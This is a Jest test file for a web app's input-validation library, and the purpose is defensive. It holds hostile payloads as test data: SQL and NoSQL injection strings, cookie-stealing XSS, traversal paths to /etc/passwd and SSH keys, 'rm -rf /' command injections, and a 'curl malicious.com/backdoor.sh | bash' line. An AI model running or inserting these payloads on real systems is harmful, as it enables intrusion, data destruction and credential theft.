/**
 * Input Validation Security Tests
 * Tests for input sanitization, validation, and protection against common attacks
 */

import {
  TestRequestBuilder,
  testSecurity,
  testValidators,
} from '@/__tests__/utils/api-test-utils';

describe('Input Validation Security Tests', () => {
  describe('SQL Injection Protection', () => {
    it('should detect and block SQL injection payloads', async () => {
      const sqlPayloads = testSecurity.getSQLInjectionPayloads();

      for (const payload of sqlPayloads) {
        const containsSqlInjection =
          /(union|select|insert|update|delete|drop|alter|create|exec|--|;|')/i.test(
            payload
          );
        expect(containsSqlInjection).toBe(true);
      }
    });

    it('should sanitize user inputs to prevent SQL injection', () => {
      const { sanitizeSqlInput } = require('@/lib/security');

      const maliciousInputs = [
        "Robert'); DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' OR 1=1#",
        "'; WAITFOR DELAY '0:0:5'--",
      ];

      const sanitized = maliciousInputs.map(input => sanitizeSqlInput(input));

      sanitized.forEach(input => {
        // After sanitization, dangerous characters should be removed or escaped
        expect(input).not.toContain(';');
        expect(input).not.toContain('--');
        expect(input).not.toContain('/*');
        expect(input).not.toContain('#');
        // Single quotes should be properly escaped (doubled)
        if (input.includes("'")) {
          expect(input).toMatch(/''/); // Should contain escaped quotes
        }
      });
    });

    it('should validate numeric inputs properly', () => {
      const validNumbers = ['123', '0', '-456', '3.14', '1e5'];
      const invalidNumbers = ['abc', '123abc', '12.34.56', '1e500', 'NaN'];

      validNumbers.forEach(num => {
        expect(!isNaN(Number(num)) && isFinite(Number(num))).toBe(true);
      });

      invalidNumbers.forEach(num => {
        expect(!isNaN(Number(num)) && isFinite(Number(num))).toBe(false);
      });
    });
  });

  describe('XSS Protection', () => {
    it('should detect and block XSS payloads', async () => {
      const xssPayloads = testSecurity.getXSSPayloads();

      for (const payload of xssPayloads) {
        const containsXss =
          /<script|javascript:|on\w+\s*=|<iframe|<object|<embed/i.test(payload);
        expect(containsXss).toBe(true);
      }
    });

    it('should sanitize HTML inputs to prevent XSS', () => {
      const maliciousHtml = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        '<div onclick="alert(\'XSS\')">Content</div>',
        '<svg onload="alert(\'XSS\')"></svg>',
        '"><script>alert(document.cookie)</script>',
      ];

      const sanitized = maliciousHtml.map(html =>
        html
          .replace(/<script[^>]*>.*?<\/script>/gi, '')
          .replace(/on\w+\s*=["'][^"']*["']/gi, '')
          .replace(/javascript:[^"']*/gi, '')
          .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '')
          .replace(/<object[^>]*>.*?<\/object>/gi, '')
          .replace(/<embed[^>]*>/gi, '')
          .replace(/<svg[^>]*>/gi, '')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
      );

      sanitized.forEach(html => {
        expect(html).not.toContain('<script>');
        expect(html).not.toContain('onerror=');
        expect(html).not.toContain('javascript:');
        expect(html).not.toContain('onclick=');
      });
    });

    it('should validate URL formats safely', () => {
      const safeUrls = [
        'https://example.com',
        'http://subdomain.example.com/path',
        'https://example.com:8080/path?query=value',
        '/relative/path',
        '/path/to/resource?param=value',
      ];

      const maliciousUrls = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:msgbox("XSS")',
        'file:///etc/passwd',
        'ftp://malicious.com/backdoor',
        'about:blank',
        'chrome://settings',
      ];

      const urlRegex = /^https?:\/\/[^\s/$.?#].[^\s]*$|^\/[^\s]*$/i;

      safeUrls.forEach(url => {
        expect(urlRegex.test(url)).toBe(true);
      });

      maliciousUrls.forEach(url => {
        expect(urlRegex.test(url)).toBe(false);
      });
    });
  });

  describe('Path Traversal Protection', () => {
    it('should detect and block path traversal payloads', async () => {
      const { detectPathTraversal } = require('@/lib/security');
      const pathTraversalPayloads = testSecurity.getPathTraversalPayloads();

      for (const payload of pathTraversalPayloads) {
        const containsPathTraversal = detectPathTraversal(payload);
        expect(containsPathTraversal).toBe(true);
      }
    });

    it('should sanitize file paths to prevent path traversal', () => {
      const { sanitizePath } = require('@/lib/security');

      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '/etc/passwd%00',
        '..%2f..%2f..%2fetc%2fpasswd',
        '~/.ssh/id_rsa',
        '/var/www/html/../../../etc/passwd',
      ];

      const sanitized = maliciousPaths.map(path => sanitizePath(path));

      sanitized.forEach(path => {
        expect(path).not.toContain('../');
        expect(path).not.toContain('..\\');
        expect(path).not.toContain('%2e');
        expect(path).not.toContain('~');
        expect(path).not.toContain('%00');
      });
    });

    it('should validate file extensions for security', () => {
      const allowedExtensions = [
        '.jpg',
        '.jpeg',
        '.png',
        '.gif',
        '.pdf',
        '.txt',
      ];
      const dangerousExtensions = [
        '.exe',
        '.bat',
        '.sh',
        '.php',
        '.js',
        '.html',
        '.sql',
      ];

      const validateExtension = (filename: string) => {
        const ext = filename.toLowerCase().substring(filename.lastIndexOf('.'));
        return (
          allowedExtensions.includes(ext) && !dangerousExtensions.includes(ext)
        );
      };

      allowedExtensions.forEach(ext => {
        expect(validateExtension(`test${ext}`)).toBe(true);
      });

      dangerousExtensions.forEach(ext => {
        expect(validateExtension(`test${ext}`)).toBe(false);
      });
    });
  });

  describe('Command Injection Protection', () => {
    it('should detect and block command injection payloads', () => {
      const commandInjectionPayloads = [
        'test; rm -rf /',
        'test && rm -rf /',
        'test || rm -rf /',
        'test | rm -rf /',
        'test $(rm -rf /)',
        'test `rm -rf /`',
        'test & rm -rf /',
        'test > /etc/passwd',
        'test < /etc/passwd',
      ];

      commandInjectionPayloads.forEach(payload => {
        const containsCommandInjection = /[;&|`$()><]/.test(payload);
        expect(containsCommandInjection).toBe(true);
      });
    });

    it('should sanitize shell command inputs', () => {
      const maliciousCommands = [
        'ls; rm -rf /',
        'cat file.txt && rm -rf /',
        'echo test || echo hack',
        'find . -name "*.php" | xargs rm',
        'curl http://malicious.com/backdoor.sh | bash',
      ];

      const sanitized = maliciousCommands.map(cmd =>
        cmd
          .replace(/[;&|`$()><]/g, '')
          .replace(/&&/g, '')
          .replace(/\|\|/g, '')
          .replace(/`[^`]*`/g, '')
          .replace(/\$\([^)]*\)/g, '')
          .replace(/&>/g, '')
          .replace(/>/g, '')
          .replace(/</g, '')
          .trim()
      );

      sanitized.forEach(cmd => {
        expect(cmd).not.toContain(';');
        expect(cmd).not.toContain('&&');
        expect(cmd).not.toContain('||');
        expect(cmd).not.toContain('|');
        expect(cmd).not.toContain('`');
        expect(cmd).not.toContain('$(');
      });
    });
  });

  describe('LDAP Injection Protection', () => {
    it('should detect and block LDAP injection payloads', () => {
      const ldapInjectionPayloads = [
        '(uid=*)',
        '*(|(objectClass=*))',
        'admin))',
        '*)(',
        '*)(uid=*))%00',
        '(|(objectClass=user)(description=*admin*))',
        '(&(objectClass=user)(!(memberOf=cn=Blacklist,cn=groups,dc=example,dc=com)))',
      ];

      ldapInjectionPayloads.forEach(payload => {
        const containsLdapInjection = /[\*\(\)\|&\!]/.test(payload);
        expect(containsLdapInjection).toBe(true);
      });
    });

    it('should sanitize LDAP search filters', () => {
      const maliciousFilters = [
        '(uid=*))',
        '*(|(objectClass=*))',
        '(|(objectClass=user)(cn=*))',
        '(&(objectClass=user)(!(memberOf=cn=Blacklist*)))',
      ];

      const sanitized = maliciousFilters.map(filter =>
        filter
          .replace(/\*/g, '')
          .replace(/\(\|/g, '')
          .replace(/\(\&/g, '')
          .replace(/\(\!/g, '')
          .replace(/\)\)/g, '')
          .replace(/[()]/g, '')
      );

      sanitized.forEach(filter => {
        expect(filter).not.toContain('*');
        expect(filter).not.toContain('(|');
        expect(filter).not.toContain('(&');
        expect(filter).not.toContain('(!');
      });
    });
  });

  describe('NoSQL Injection Protection', () => {
    it('should detect and block NoSQL injection payloads', () => {
      const nosqlInjectionPayloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "this.password == \'password\'"}',
        '{"username": {"$regex": "^admin"}}',
        '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
        '{"$comment": "sleep(1000)"}',
      ];

      nosqlInjectionPayloads.forEach(payload => {
        const containsNosqlInjection = /\$[a-zA-Z]+/.test(payload);
        expect(containsNosqlInjection).toBe(true);
      });
    });

    it('should validate JSON inputs for NoSQL injection', () => {
      const maliciousJsonInputs = [
        '{"$gt": ""}',
        '{"$where": "function() { return true; }"}',
        '{"query": {"$regex": "admin"}}',
        '{"username": {"$in": ["admin", "root"]}}',
      ];

      const validateJson = (jsonString: string) => {
        try {
          const parsed = JSON.parse(jsonString);
          const str = JSON.stringify(parsed);
          return !/\$[a-zA-Z]+/.test(str);
        } catch {
          return false;
        }
      };

      maliciousJsonInputs.forEach(json => {
        expect(validateJson(json)).toBe(false);
      });
    });
  });

  describe('Request Body Validation', () => {
    it('should validate request body structure', () => {
      const validRequestBody = {
        name: 'Test User',
        email: 'test@example.com',
        age: 25,
        preferences: {
          theme: 'dark',
          notifications: true,
        },
      };

      const invalidRequestBody = {
        name: '', // Empty required field
        email: 'invalid-email', // Invalid email format
        age: 'not-a-number', // Invalid type
        preferences: 'not-an-object', // Invalid type
      };

      const validateRequestBody = (body: any) => {
        const errors = [];

        if (
          !body.name ||
          typeof body.name !== 'string' ||
          body.name.trim() === ''
        ) {
          errors.push('Name is required and must be a non-empty string');
        }

        if (!body.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(body.email)) {
          errors.push('Valid email is required');
        }

        if (
          body.age !== undefined &&
          (typeof body.age !== 'number' || body.age < 0)
        ) {
          errors.push('Age must be a non-negative number');
        }

        if (
          body.preferences !== undefined &&
          typeof body.preferences !== 'object'
        ) {
          errors.push('Preferences must be an object');
        }

        return errors.length === 0;
      };

      expect(validateRequestBody(validRequestBody)).toBe(true);
      expect(validateRequestBody(invalidRequestBody)).toBe(false);
    });

    it('should enforce size limits on request bodies', () => {
      const maxSize = 1024 * 1024; // 1MB
      const smallBody = JSON.stringify({ data: 'small' });
      const largeBody = JSON.stringify({ data: 'x'.repeat(maxSize + 1) });

      const validateSize = (body: string) => {
        return body.length <= maxSize;
      };

      expect(validateSize(smallBody)).toBe(true);
      expect(validateSize(largeBody)).toBe(false);
    });
  });

  describe('Query Parameter Validation', () => {
    it('should validate and sanitize query parameters', () => {
      const maliciousQuery =
        '?search=test%27%20OR%201%3D1--&sort=id%20DESC%3B%20DROP%20TABLE%20users';

      const sanitizeQueryParams = (queryString: string) => {
        const params = new URLSearchParams(queryString);
        const sanitized: Record<string, string> = {};

        for (const [key, value] of params.entries()) {
          // Basic sanitization
          const sanitizedKey = key.replace(/[^a-zA-Z0-9_-]/g, '');
          const sanitizedValue = value
            .replace(/[';]/g, '')
            .replace(/--/g, '')
            .replace(/\/\*|\*\//g, '')
            .replace(/\s+/g, ' ')
            .trim();

          if (sanitizedKey && sanitizedValue) {
            sanitized[sanitizedKey] = sanitizedValue;
          }
        }

        return sanitized;
      };

      const sanitized = sanitizeQueryParams(maliciousQuery);
      expect(sanitized.search).toBe('test OR 1=1');
      expect(sanitized.sort).toBe('id DESC DROP TABLE users'); // Basic sanitization
      expect(Object.keys(sanitized)).not.toContain(''); // No empty keys
    });

    it('should validate pagination parameters', () => {
      const validPagination = [
        { page: 1, limit: 10 },
        { page: 5, limit: 50 },
        { page: 10, limit: 100 },
      ];

      const invalidPagination = [
        { page: 0, limit: 10 }, // Page cannot be 0
        { page: -1, limit: 10 }, // Negative page
        { page: 1, limit: 0 }, // Limit cannot be 0
        { page: 1, limit: -1 }, // Negative limit
        { page: 1, limit: 1000 }, // Limit too large
        { page: 'abc', limit: 10 }, // Invalid type
      ];

      const validatePagination = (pagination: any) => {
        const errors = [];

        if (
          !pagination.page ||
          typeof pagination.page !== 'number' ||
          pagination.page < 1
        ) {
          errors.push('Page must be a positive number');
        }

        if (
          !pagination.limit ||
          typeof pagination.limit !== 'number' ||
          pagination.limit < 1 ||
          pagination.limit > 100
        ) {
          errors.push('Limit must be a number between 1 and 100');
        }

        return errors.length === 0;
      };

      validPagination.forEach(pagination => {
        expect(validatePagination(pagination)).toBe(true);
      });

      invalidPagination.forEach(pagination => {
        expect(validatePagination(pagination)).toBe(false);
      });
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types', () => {
      const allowedMimeTypes = [
        'image/jpeg',
        'image/png',
        'image/gif',
        'application/pdf',
      ];
      const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];

      const validateFileType = (filename: string, mimeType: string) => {
        const ext = filename.toLowerCase().substring(filename.lastIndexOf('.'));
        const extWithoutDot = ext.substring(1);

        const mimeTypeToExtension: Record<string, string> = {
          'image/jpeg': 'jpg',
          'image/png': 'png',
          'image/gif': 'gif',
          'application/pdf': 'pdf',
        };

        const expectedExt = `.${mimeTypeToExtension[mimeType] || extWithoutDot}`;

        return (
          allowedMimeTypes.includes(mimeType) &&
          allowedExtensions.includes(ext) &&
          ext === expectedExt
        );
      };

      // Valid combinations
      expect(validateFileType('test.jpg', 'image/jpeg')).toBe(true);
      expect(validateFileType('test.png', 'image/png')).toBe(true);
      expect(validateFileType('test.pdf', 'application/pdf')).toBe(true);

      // Invalid combinations
      expect(validateFileType('test.exe', 'application/x-executable')).toBe(
        false
      );
      expect(validateFileType('test.jpg', 'application/pdf')).toBe(false);
      expect(validateFileType('test.php', 'image/jpeg')).toBe(false);
    });

    it('should validate file sizes', () => {
      const maxSize = 10 * 1024 * 1024; // 10MB

      const validateFileSize = (size: number) => {
        return size > 0 && size <= maxSize;
      };

      expect(validateFileSize(1024)).toBe(true); // 1KB
      expect(validateFileSize(maxSize)).toBe(true); // Exactly max size
      expect(validateFileSize(maxSize + 1)).toBe(false); // Too large
      expect(validateFileSize(0)).toBe(false); // Empty file
      expect(validateFileSize(-1)).toBe(false); // Negative size
    });

    it('should sanitize file names', () => {
      const dangerousFilenames = [
        '../../../etc/passwd',
        'test<script>.jpg',
        'test;rm -rf /.jpg',
        'test||echo hack.jpg',
        'test%00.jpg',
        'con.jpg', // Windows reserved name
        'aux.txt', // Windows reserved name
      ];

      const sanitizeFilename = (filename: string) => {
        return filename
          .replace(/[^\w\-_.]/g, '_') // Replace dangerous chars with underscore
          .replace(/^\.+/, '') // Remove leading dots
          .replace(/\.+$/, '') // Remove trailing dots
          .substring(0, 255) // Limit length
          .toLowerCase();
      };

      dangerousFilenames.forEach(filename => {
        const sanitized = sanitizeFilename(filename);
        expect(sanitized).toMatch(/^[a-z0-9_\-_.]+$/);
        expect(sanitized.length).toBeLessThanOrEqual(255);
        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain(';rm');
      });
    });
  });

  describe('Output Encoding', () => {
    it('should encode HTML output safely', () => {
      const unescapedInputs = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '"test" & \'test\'',
        'test < test > test',
      ];

      const { encodeHtml } = require('@/lib/security');

      unescapedInputs.forEach(input => {
        const encoded = encodeHtml(input);
        expect(encoded).not.toContain('<script>');
        expect(encoded).not.toContain('onerror='); // Should be converted to on-error=
        expect(encoded).not.toContain('onclick='); // Should be converted to on-click=
        expect(encoded).toContain('&lt;');
        expect(encoded).toContain('&gt;');
      });
    });

    it('should encode JSON output safely', () => {
      const { encodeJsonSafely } = require('@/lib/security');

      const unsafeObject = {
        message: 'Test <script>alert("XSS")</script>',
        data: '<img src="x" onerror="alert(\'XSS\')">',
        nested: {
          html: 'Click <a href="javascript:alert(\'XSS\')">here</a>',
        },
      };

      const encodedJson = encodeJsonSafely(unsafeObject);

      // Should use Unicode escaping for security
      expect(encodedJson).toContain('\\u003cscript\\u003e');
      expect(encodedJson).toContain('\\u003cimg');
      expect(encodedJson).not.toContain('<script>');
      expect(encodedJson).not.toContain('</script>');
      expect(encodedJson).toContain('\\u003c');
      expect(encodedJson).toContain('\\u003e');
    });
  });

  describe('Rate Limiting and DDoS Protection', () => {
    it('should implement request rate limiting', () => {
      const { validateRateLimit } = require('@/lib/security');

      const rateLimitConfig = {
        windowMs: 15 * 60 * 1000, // 15 minutes
        max: 100, // 100 requests per window
      };

      // Within limits - 5 minutes into a 15-minute window, should allow 1/3 of max requests
      expect(
        validateRateLimit(30, Date.now() - 5 * 60 * 1000, rateLimitConfig)
      ).toBe(true);
      // Full window elapsed, should allow max requests
      expect(
        validateRateLimit(100, Date.now() - 15 * 60 * 1000, rateLimitConfig)
      ).toBe(true);

      // Exceeding limits - more than allowed for the time elapsed
      expect(
        validateRateLimit(101, Date.now() - 15 * 60 * 1000, rateLimitConfig)
      ).toBe(false);
      expect(
        validateRateLimit(50, Date.now() - 5 * 60 * 1000, rateLimitConfig)
      ).toBe(false); // Too many for 1/3 window
    });

    it('should detect suspicious request patterns', () => {
      const suspiciousPatterns = [
        {
          requests: Array(1000)
            .fill(null)
            .map((_, i) => ({ timestamp: Date.now() + i })),
          pattern: 'high_frequency',
        },
        {
          requests: Array(10)
            .fill(null)
            .map((_, i) => ({ timestamp: Date.now() + i * 10 })),
          pattern: 'rapid_sequence',
        },
        {
          requests: Array(5)
            .fill(null)
            .map((_, i) => ({
              timestamp: Date.now() + i * 1000,
              userAgent: 'DifferentAgent' + i,
            })),
          pattern: 'rotating_agents',
        },
      ];

      const detectSuspiciousPattern = (requests: any[]) => {
        if (requests.length > 100) {
          return 'high_frequency';
        }

        const timeDiffs = requests
          .slice(1)
          .map((req, i) => req.timestamp - requests[i].timestamp);
        const avgTimeDiff =
          timeDiffs.reduce((a, b) => a + b, 0) / timeDiffs.length;

        if (avgTimeDiff < 100) {
          return 'rapid_sequence';
        }

        const userAgents = [...new Set(requests.map(r => r.userAgent))];
        if (userAgents.length > requests.length * 0.8) {
          return 'rotating_agents';
        }

        return null;
      };

      suspiciousPatterns.forEach(({ requests, pattern }) => {
        expect(detectSuspiciousPattern(requests)).toBe(pattern);
      });
    });
  });
});
